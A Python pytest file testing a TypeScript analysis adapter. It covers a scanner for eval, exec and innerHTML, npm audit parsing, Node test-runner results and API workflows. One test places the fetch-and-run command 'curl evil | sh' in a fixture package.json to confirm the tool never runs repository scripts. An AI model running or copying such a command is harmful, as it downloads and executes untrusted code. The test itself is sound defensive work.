from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.adapters import ts_adapter
from app.adapters.models import BaselineReport, Finding
from app.adapters.registry import choose_adapter
from app.adapters.ts_adapter import NO_NODE, TypeScriptAdapter
from app.adapters.ts_deps import lock_versions, parse_package_json
from app.adapters.ts_scan import blank, scan_source, scan_typescript
from app.agents.roadmap import build_roadmap
from app.config import FIXTURES_DIR, Settings
from app.execution import runner as runner_mod
from app.execution.runner import CommandResult, HostFixtureRunner
from app.graph.runner import InlineExecutor
from app.main import create_app
from tests.conftest import OfflineAdapter
from tests.helpers import parse_sse

FIXTURE = FIXTURES_DIR / "legacy-ts-utils"


def write(root: Path, rel: str, text: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


# -------------------------------------------------------------------- scanner
def test_blank_hides_comments_and_strings_but_keeps_layout():
    src = 'const a = "eval(1)"; // eval(2)\n/* new Function("x")\n still */ const b = `x ${y + 1} z`;\n'
    out = blank(src)
    assert len(out) == len(src) and out.count("\n") == src.count("\n")
    assert "eval" not in out and "Function" not in out
    assert "${" in out and "y + 1" not in out  # interpolation is marked, its body is blanked


def test_dangerous_calls_are_found_in_code_not_in_comments_or_strings():
    src = (
        '// eval("a")\nconst s = "document.write(1)";\n'
        "const r = eval(input);\nconst f = new Function('a', 'return a');\n"
        "el.innerHTML = html;\nel.innerHTML == other;\ndocument.write(x);\n"
        "<div dangerouslySetInnerHTML={{ __html: h }} />;\nobj.eval(1);\n"
    )
    found = {(f.title, f.line) for f in scan_source(src, "a.tsx").findings}
    assert found == {
        ("Use of `eval`", 3), ("Use of `new Function`", 4), ("Assignment to `innerHTML`", 5),
        ("`document.write` call", 7), ("Use of `dangerouslySetInnerHTML`", 8),
    }  # fmt: skip


@pytest.mark.parametrize(
    ("call", "severity"),
    [
        ('exec("ls -la")', "medium"),
        ("exec(`ls -la`)", "medium"),
        ('exec("ls " + dir)', "high"),
        ("exec(`ls ${dir}`)", "high"),
        ("exec(cmd, cb)", "high"),
        ("execSync(cmd)", "high"),
    ],
)
def test_shell_exec_severity_depends_on_whether_the_argument_is_dynamic(call: str, severity: str):
    src = f'import {{ exec, execSync }} from "child_process";\n{call};\n'
    [f] = scan_source(src, "a.ts").findings
    assert f.severity == severity and f.line == 2 and f.source == "ts-scan"


def test_exec_is_ignored_unless_child_process_is_imported():
    assert scan_source("const exec = (x) => x;\nexec(a + b);\n", "a.ts").findings == []
    assert scan_source('const cp = require("node:child_process");\ncp.exec(a);\n', "a.js").findings


def test_test_files_are_counted_not_scanned_and_smells_are_counted():
    tests = 'import {test} from "node:test";\ntest("a", () => {});\ntest.skip("b", () => {});\nit("c", ()=>{});\neval(x);\n'
    t = scan_source(tests, "test/a.test.ts")
    assert (t.test_files, t.test_functions, t.findings) == (1, 3, [])
    smells = "// @ts-ignore\nconst a: any = 1;\nconst b = x as any;\n/* @ts-nocheck */\n"
    s = scan_source(smells, "src/a.ts")
    assert (s.suppressions, s.any_uses, s.test_files) == (2, 2, 0)


def test_scan_walks_a_tree_and_skips_vendor_declarations_symlinks_and_big_files(tmp_path: Path):
    write(tmp_path, "src/a.ts", "const r = eval(x);\n")
    write(tmp_path, "src/b.js", "const q = 1;\n")
    write(tmp_path, "src/types.d.ts", "declare const x: any;\n")
    write(tmp_path, "node_modules/p/i.ts", "eval(1);\n")
    write(tmp_path, "dist/o.js", "eval(1);\n")
    outside = tmp_path.parent / "outside.ts"
    outside.write_text("eval(1);\n")
    (tmp_path / "src" / "link.ts").symlink_to(outside)
    write(tmp_path, "src/huge.ts", "x" * 1_000_001)
    scan = scan_typescript(tmp_path)
    assert scan.files == 2 and [f.file_path for f in scan.findings] == ["src/a.ts"]


def test_scanner_never_executes_the_code_it_reads(tmp_path: Path):
    marker = tmp_path / "ran"
    write(tmp_path, "src/boom.ts", f'require("fs").writeFileSync({str(marker)!r}, "x");\n')
    scan_typescript(tmp_path)
    assert not marker.exists()


# --------------------------------------------------------------- package.json
def test_package_json_pins_ranges_and_sections():
    deps, meta = parse_package_json(
        json.dumps({
            "name": "x", "type": "module", "scripts": {"test": "node --test"},
            "dependencies": {"lodash": "4.17.15", "react": "^18.2.0", "left-pad": "latest"},
            "devDependencies": {"typescript": "5.4.2-beta.1", "vitest": "~1.0.0"},
        }),
        "package.json",
    )  # fmt: skip
    pins = {d.name: d.pinned_version for d in deps}
    assert pins == {
        "lodash": "4.17.15", "react": None, "left-pad": None,
        "typescript": "5.4.2-beta.1", "vitest": None,
    }  # fmt: skip
    assert meta["scripts"] == {"test": "node --test"} and meta["name"] == "x"


@pytest.mark.parametrize("text", ["{not json", "[1, 2]", ""])
def test_unusable_package_json_raises_value_error(text: str):
    with pytest.raises(ValueError):
        parse_package_json(text, "package.json")


def test_lock_versions_supports_v1_v2_and_v3_and_bad_input():
    v3 = json.dumps({"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0"},
                     "node_modules/a/node_modules/b": {"version": "2.0.0"}}})  # fmt: skip
    assert lock_versions(v3) == {"a": "1.0.0", "b": "2.0.0"}
    assert lock_versions(json.dumps({"dependencies": {"c": {"version": "3.0.0"}}})) == {
        "c": "3.0.0"
    }
    assert lock_versions("garbage") == {}


# ------------------------------------------------------------------- selection
def test_adapter_selection_follows_the_dominant_language(tmp_path: Path):
    ts, py = TypeScriptAdapter(), OfflineAdapter()
    assert ts.score(FIXTURE) == 3 and py.score(FIXTURE) == 0
    assert choose_adapter([py, ts], FIXTURE) is ts
    assert choose_adapter([py, ts], FIXTURES_DIR / "legacy-python-cli") is py
    mixed = tmp_path / "mixed"
    write(mixed, "a.py", "x = 1\n")
    write(mixed, "b.py", "x = 1\n")
    write(mixed, "c.ts", "export const x = 1;\n")
    assert choose_adapter([py, ts], mixed) is py  # more Python files
    write(mixed, "d.ts", "export const y = 1;\n")
    assert choose_adapter([py, ts], mixed) is py  # tie goes to the earlier adapter
    write(mixed, "e.ts", "export const z = 1;\n")
    assert choose_adapter([py, ts], mixed) is ts
    empty = tmp_path / "empty"
    write(empty, "main.go", "package main\n")
    assert choose_adapter([py, ts], empty) is None


def test_plain_javascript_counts_only_in_a_typescript_project(tmp_path: Path):
    write(tmp_path, "index.js", "module.exports = 1;\n")
    assert TypeScriptAdapter().score(tmp_path) == 0
    write(tmp_path, "tsconfig.json", "{}")
    assert TypeScriptAdapter().score(tmp_path) == 1


# --------------------------------------------------------------------- autopsy
AUDIT = {
    "vulnerabilities": {
        "lodash": {
            "severity": "high", "fixAvailable": {"name": "lodash", "version": "4.17.21", "isSemVerMajor": False},
            "via": [{"title": "Prototype Pollution in lodash"}, {"title": "Command Injection in lodash"},
                    {"title": "Prototype Pollution in lodash"}],
        },
        "minimist": {"severity": "moderate", "fixAvailable": True, "via": ["lodash"]},
        "old": {"severity": "low", "fixAvailable": False, "via": []},
    },
    "metadata": {"vulnerabilities": {"total": 3}, "dependencies": {"total": 40}},
}  # fmt: skip


def fake_npm(monkeypatch, payload: dict | None, exit_code: int = 1, stderr: str = ""):
    calls: list[tuple[list[str], Path]] = []

    def fake(argv, cwd, timeout, env, **kw):
        calls.append((list(argv), Path(cwd)))
        calls[-1] = (*calls[-1], sorted(p.name for p in Path(cwd).iterdir()))  # type: ignore[assignment]
        return CommandResult(
            argv=list(argv), exit_code=exit_code, stderr=stderr, duration_seconds=0.3,
            stdout=json.dumps(payload) if payload is not None else "",
        )  # fmt: skip

    monkeypatch.setattr(ts_adapter, "run_command", fake)
    return calls


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    dest = tmp_path / "repo"
    shutil.copytree(FIXTURE, dest)
    return dest


def autopsy(repo: Path, tmp_path: Path):
    return TypeScriptAdapter(npm="/usr/bin/npm").autopsy(
        repo, "r", tmp_path / "scratch", lambda r: None
    )


def test_autopsy_reports_real_evidence_and_leaves_the_repository_alone(repo, tmp_path, monkeypatch):
    calls = fake_npm(monkeypatch, AUDIT)
    before = {p: p.read_bytes() for p in repo.rglob("*") if p.is_file()}
    rep = autopsy(repo, tmp_path)
    assert {p: p.read_bytes() for p in repo.rglob("*") if p.is_file()} == before
    assert (rep.language, rep.source_files, rep.test_files, rep.test_functions) == (
        "TypeScript",
        3,
        1,
        2,
    )
    assert rep.lockfile_present and rep.dependency_files == ["package.json"]
    assert (rep.known_vulnerabilities, rep.vulnerable_packages, rep.audited_packages) == (3, 3, 40)
    assert rep.lint_violations is None  # ESLint is not run, so it is unknown, not zero
    titles = {f.title for f in rep.findings}
    assert {"Use of `eval`", "Shell command via `child_process.exec`"} <= titles
    assert any("API_TOKEN" in t for t in titles) and "No CI workflow found" in titles
    assert "legacy-token-do-not-commit" not in rep.model_dump_json()
    ids = [f.id for f in rep.findings]
    assert ids == [f"F-{i:03d}" for i in range(1, len(ids) + 1)]
    [(argv, cwd, copied)] = calls  # npm saw only the two manifests, in a scratch directory
    assert copied == ["package-lock.json", "package.json"] and cwd != repo
    assert argv[1:5] == ["audit", "--package-lock-only", "--json", "--ignore-scripts"]


def test_npm_findings_carry_severity_fix_versions_and_deduplicated_titles(
    repo, tmp_path, monkeypatch
):
    fake_npm(monkeypatch, AUDIT)
    by_pkg = {f.package: f for f in autopsy(repo, tmp_path).findings if f.source == "npm-audit"}
    lodash = by_pkg["lodash"]
    assert (lodash.severity, lodash.installed_version, lodash.fix_versions) == (
        "high",
        "4.17.15",
        ["4.17.21"],
    )
    assert lodash.title == "lodash 4.17.15 has known vulnerabilities"
    assert (
        lodash.evidence.count("Prototype Pollution") == 1
        and "Fix available: lodash@4.17.21" in lodash.evidence
    )
    assert (
        by_pkg["minimist"].severity == "medium" and "npm audit fix" in by_pkg["minimist"].evidence
    )
    assert by_pkg["old"].severity == "low" and "No fix is available" in by_pkg["old"].evidence


@pytest.mark.parametrize(
    ("payload", "code", "why"),
    [(None, 1, "no JSON"), ({"error": {"summary": "ENOTFOUND registry.npmjs.org"}}, 1, "no JSON")],
)
def test_a_failed_audit_is_not_measured_not_zero(repo, tmp_path, monkeypatch, payload, code, why):
    fake_npm(monkeypatch, payload, code, "npm ERR! network")
    rep = autopsy(repo, tmp_path)
    tool = next(t for t in rep.tools if t.tool == "npm-audit")
    assert not tool.measured and tool.summary.startswith("Not measured")
    assert rep.known_vulnerabilities is None and rep.audited_packages is None
    assert not any(f.source == "npm-audit" for f in rep.findings)


def test_no_lockfile_means_no_audit_and_a_finding(repo, tmp_path, monkeypatch):
    calls = fake_npm(monkeypatch, AUDIT)
    (repo / "package-lock.json").unlink()
    rep = autopsy(repo, tmp_path)
    assert calls == [] and rep.known_vulnerabilities is None and not rep.lockfile_present
    assert "No lockfile found" in {f.title for f in rep.findings}
    assert rep.unpinned_dependencies == []  # lodash is pinned exactly


def test_missing_npm_is_reported(repo, tmp_path, monkeypatch):
    monkeypatch.setattr(ts_adapter.shutil, "which", lambda name: None)
    rep = TypeScriptAdapter().autopsy(repo, "r", tmp_path / "s", lambda r: None)
    assert (
        next(t for t in rep.tools if t.tool == "npm-audit").summary
        == "Not measured: npm is not installed"
    )


def test_unmeasured_tools_are_listed_with_the_reason(repo, tmp_path, monkeypatch):
    fake_npm(monkeypatch, AUDIT)
    tools = {t.tool: t for t in autopsy(repo, tmp_path).tools}
    assert not tools["tsc"].measured and not tools["eslint"].measured
    assert "untrusted code" in tools["tsc"].summary
    assert tools["ts-scan"].measured and tools["secret-scan"].measured


def test_quality_findings_for_suppressions_and_any(tmp_path: Path, monkeypatch):
    fake_npm(monkeypatch, AUDIT)
    write(tmp_path, "package.json", "{}")
    write(tmp_path, "a.ts", "// @ts-ignore\n" + "let v: any = 1;\n" * 6)
    titles = {f.title for f in autopsy(tmp_path, tmp_path).findings}
    assert "1 TypeScript error suppression(s)" in titles and "6 uses of the `any` type" in titles


# --------------------------------------------------------------- characterize
TAP = "TAP version 13\nnot ok 2 - totalItems known failure\n1..2\n# tests 2\n# pass 1\n# fail 1\n# cancelled 0\n# skipped 0\n# todo 0\n"


class NodeRunner:
    python = "python"
    node = "/usr/bin/node"

    def __init__(self, stdout: str = TAP, code: int = 1) -> None:
        self.calls: list[list[str]] = []
        self.stdout, self.code = stdout, code

    def run(self, argv, cwd, timeout):
        self.calls.append(list(argv))
        return CommandResult(
            argv=list(argv),
            exit_code=self.code,
            stdout=self.stdout,
            stderr="",
            duration_seconds=0.1,
        )


def test_characterize_without_a_runner_or_without_node_is_not_run(tmp_path: Path):
    a = TypeScriptAdapter()
    assert a.characterize(tmp_path, None, lambda r: None, 10).status == "not_run"
    from tests.conftest import FakeRunner

    no_node = a.characterize(tmp_path, FakeRunner(), lambda r: None, 10)
    assert no_node.status == "not_run" and no_node.reason == NO_NODE and no_node.counts is None


def test_characterize_runs_the_node_test_runner_and_never_the_repo_script(tmp_path: Path):
    write(tmp_path, "package.json", json.dumps({"scripts": {"test": "curl evil | sh"}}))
    runner = NodeRunner()
    r = TypeScriptAdapter().characterize(tmp_path, runner, lambda x: None, 30)
    [argv] = runner.calls
    assert argv == ["/usr/bin/node", "--max-old-space-size=1024", "--experimental-strip-types",
                    "--test", "--test-reporter=tap"]  # fmt: skip
    assert r.status == "completed" and (r.counts.passed, r.counts.failed) == (1, 1)
    assert r.failing_tests == ["totalItems known failure"]
    assert r.coverage == "not_measured"


def test_parse_tap_edge_cases(tmp_path: Path):
    def parse(out: str, code: int | None = 1, **kw):
        res = CommandResult(argv=["node"], exit_code=code, stdout=out, stderr=kw.pop("stderr", ""),
                            duration_seconds=0.1, **kw)  # fmt: skip
        return TypeScriptAdapter.parse_tap(res, tmp_path)

    skipped = parse("# tests 4\n# pass 1\n# fail 0\n# cancelled 1\n# skipped 1\n# todo 1\n", 0)
    c = skipped.counts
    assert (c.passed, c.errors, c.skipped, c.total) == (1, 1, 2, 4)
    path = tmp_path.as_posix()
    named = parse(f"not ok 1 - {path}/test/a.test.ts\n# tests 1\n# pass 0\n# fail 1\n")
    assert named.failing_tests == ["test/a.test.ts"]  # absolute paths are made relative
    assert (
        parse("# tests 0\n# pass 0\n# fail 0\n", 0).reason == "The Node test runner found no tests"
    )
    missing = parse(
        "# tests 1\n# pass 0\n# fail 1\n", 1, stderr="ERR_MODULE_NOT_FOUND: Cannot find package 'x'"
    )
    assert "Dependencies are not installed" in missing.reason and missing.status == "completed"
    none = parse("", 1)
    assert none.status == "failed_to_execute" and none.counts is None
    old = parse("", 9, stderr="node: bad option: --experimental-strip-types")
    assert "needs 22.6+" in old.reason
    timeout = parse("", None, timed_out=True, error="Timed out after 5s")
    assert timeout.status == "failed_to_execute" and timeout.timed_out


@pytest.mark.skipif(
    shutil.which("node") is None, reason="node is not installed; this test did NOT run"
)
def test_real_node_runs_the_fixture_tests(repo, tmp_path):
    r = TypeScriptAdapter().characterize(
        repo, HostFixtureRunner(tmp_path / "home"), lambda x: None, 60
    )
    assert r.status == "completed" and (r.counts.passed, r.counts.failed) == (1, 1)
    assert r.failing_tests == ["totalItems known failure"]
    assert not (repo / "node_modules").exists()


def test_node_commands_get_a_heap_cap_instead_of_an_address_space_cap(monkeypatch, tmp_path: Path):
    seen = []
    monkeypatch.setattr(
        runner_mod, "run_command", lambda *a, **k: seen.append((a[0][0], k["memory_bytes"]))
    )
    host = HostFixtureRunner(tmp_path)
    host.run(["/opt/node/bin/node", "-v"], tmp_path, 5)
    host.run(["/usr/bin/python3", "-V"], tmp_path, 5)
    assert seen == [("/opt/node/bin/node", None), ("/usr/bin/python3", 2 * 1024**3)]


def test_fix_lint_has_no_automatic_fixer(tmp_path: Path):
    assert TypeScriptAdapter().fix_lint({"a.ts": "x"}, tmp_path, lambda r: None) == {}


# -------------------------------------------------------------------- planning
def finding(**kw) -> Finding:
    base = dict(
        id="F-001", category="security", severity="high", title="t", evidence="e", source="ts-scan"
    )
    return Finding(**{**base, **kw})


def test_roadmap_gives_typescript_specific_advice():
    from app.adapters.models import AutopsyReport

    rep = AutopsyReport(
        repository_name="r", language="TypeScript", frameworks=[], source_files=1, source_lines=1,
        dependency_files=[], dependencies=[], unpinned_dependencies=[], lockfile_present=True,
        test_files=1, test_functions=1, test_config=[], build_files=[], has_dockerfile=False,
        has_ci=False, findings=[
            finding(id="F-001", title="Use of `eval`", file_path="a.ts", line=1),
            finding(id="F-002", category="dependencies", source="npm-audit", title="lodash 4.17.15 has known vulnerabilities",
                    evidence="Prototype Pollution. Fix available: lodash@4.17.21.", package="lodash", file_path="package.json"),
        ], tools=[], known_vulnerabilities=None, vulnerable_packages=None, lint_violations=None,
    )  # fmt: skip
    tasks = {t.title: t for t in build_roadmap(rep, BaselineReport(status="not_run")).tasks}
    assert "execFile" in tasks["Use of `eval`"].proposed_action
    npm = tasks["Upgrade lodash to a patched release"]
    assert (
        "npm install lodash@" in npm.proposed_action and "package-lock.json" in npm.proposed_action
    )
    assert "npm audit reports no known vulnerabilities" in npm.verification


# ------------------------------------------------------------------ end to end
def make_client(settings: Settings, monkeypatch, llm=None, runner=None) -> TestClient:
    fake_npm(monkeypatch, AUDIT)
    app = create_app(
        settings, executor=InlineExecutor(), adapter=OfflineAdapter(),
        ts_adapter=TypeScriptAdapter(npm="/usr/bin/npm"),
        runner_factory=lambda st, home: (runner or NodeRunner()) if st == "fixture" else None,
        llm_client=llm,
    )  # fmt: skip
    app.state.sse_poll_seconds = 0.01
    return TestClient(app)


def start(client: TestClient, source: dict, mode: str) -> dict:
    repo = client.post("/api/repositories/import", json=source).json()["id"]
    return client.post("/api/revive/start", json={"repository_id": repo, "mode": mode}).json()


def artifact(client: TestClient, run_id: str, name: str) -> str:
    arts = client.get(f"/api/revive/{run_id}/artifacts").json()
    art = next(a for a in arts if a["name"] == name)
    return client.get(f"/api/revive/{run_id}/artifacts/{art['id']}").text


def test_inspect_on_a_typescript_fixture_uses_the_typescript_adapter(settings, monkeypatch):
    client = make_client(settings, monkeypatch)
    run = start(client, {"fixture_id": "legacy-ts-utils"}, "INSPECT")
    assert run["status"] == "COMPLETED", run["error"]
    autopsy_json = json.loads(artifact(client, run["id"], "autopsy.json"))
    assert autopsy_json["language"] == "TypeScript"
    assert "Source files: 3" in artifact(client, run["id"], "AUTOPSY_REPORT.md")
    base = json.loads(artifact(client, run["id"], "characterization.json"))
    assert base["counts"]["passed"] == 1 and base["failing_tests"] == ["totalItems known failure"]


def test_revive_on_typescript_patches_only_what_is_safe_and_explains_the_rest(
    settings, monkeypatch
):
    client = make_client(settings, monkeypatch)
    run = start(client, {"fixture_id": "legacy-ts-utils"}, "REVIVE")
    assert run["status"] == "AWAITING_APPROVAL"
    ps = json.loads(artifact(client, run["id"], "patches.v1.json"))
    assert [p["path"] for p in ps["patches"]] == [".github/workflows/ci.yml"]
    ci = ps["patches"][0]["after_content"]
    assert "actions/setup-node@v4" in ci and "npm ci" in ci and "npx tsc --noEmit" in ci
    assert "pip install" not in ci and "pytest" not in ci  # no Python template leaks through
    reasons = {s["title"]: s["reason"] for s in ps["skipped"]}
    assert any("package-lock.json together" in r for r in reasons.values())
    assert any("Dockerfile template for TypeScript" in r for r in reasons.values())
    assert sum("person must decide" in r for r in reasons.values()) == 3  # exec, eval, secret

    final = client.post(
        f"/api/revive/approve/{run['id']}", json={"decision": "approve", "roadmap_version": 1}
    ).json()
    assert final["status"] == "COMPLETED", final["error"]
    work = settings.data_dir / "runs" / run["id"] / "work"
    assert (work / ".github" / "workflows" / "ci.yml").exists()
    assert not (FIXTURE / ".github").exists()  # the fixture itself is untouched
    verification = json.loads(artifact(client, run["id"], "verification.json"))
    checks = {c["name"]: c for c in verification["checks"]}
    assert (
        checks["lint"]["status"] == "not_measured"
        and "linter did not run" in checks["lint"]["detail"]
    )
    assert checks["ci_workflows"]["status"] == "passed"


def test_typescript_findings_are_never_sent_to_a_model(settings, monkeypatch):
    from tests.test_llm_patches import FakeClient

    llm = FakeClient()
    client = make_client(settings, monkeypatch, llm=llm)
    run = start(client, {"fixture_id": "legacy-ts-utils"}, "PREVIEW")
    ps = json.loads(artifact(client, run["id"], "patches.v1.json"))
    assert llm.calls == [] and ps["llm"]["requests"] == 0
    assert any("Only Python findings" in s["reason"] for s in ps["skipped"])


def test_the_vitality_score_leaves_code_quality_unknown_for_typescript(settings, monkeypatch):
    client = make_client(settings, monkeypatch)
    run = start(client, {"fixture_id": "legacy-ts-utils"}, "INSPECT")
    events = parse_sse(client.get(f"/api/revive/stream/{run['id']}").text)
    score = next(e for e in events if e["type"] == "health_score_updated")["payload"]
    dims = {d["name"]: d["score"] for d in score["dimensions"]}
    assert dims["code_quality"] is None and score["unmeasured"] == ["code_quality"]
    assert dims["dependencies"] == 92.5  # 3 of 40 audited packages are vulnerable


def test_an_unsupported_language_names_the_supported_ones(settings, allowed_root, monkeypatch):
    client = make_client(settings, monkeypatch)
    repo = allowed_root / "go"
    repo.mkdir()
    (repo / "main.go").write_text("package main\n")
    run = start(client, {"local_path": str(repo)}, "INSPECT")
    assert run["status"] == "FAILED" and "Python, TypeScript" in run["error"]
